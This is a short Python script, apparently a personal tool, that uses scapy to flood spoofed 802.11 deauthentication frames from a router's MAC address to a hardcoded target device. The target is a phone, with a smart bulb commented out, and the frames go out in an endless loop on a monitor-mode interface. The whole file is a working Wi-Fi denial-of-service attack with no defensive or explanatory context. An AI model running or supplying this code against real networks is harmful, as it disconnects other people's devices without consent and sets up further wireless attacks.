import os
from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp, conf)

#target_mac = "78:11:dc:aa:53:32" # Yeelight
target_mac = "c0:ee:fb:df:58:08" # Phone
gateway_mac = "0c:80:63:59:d1:ce"

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap()/dot11/Dot11Deauth(reason=7)

while True:
    for i in range(64):
        sendp(packet, inter=0.0001, count=171, iface="wlp3s0mon", verbose=1)

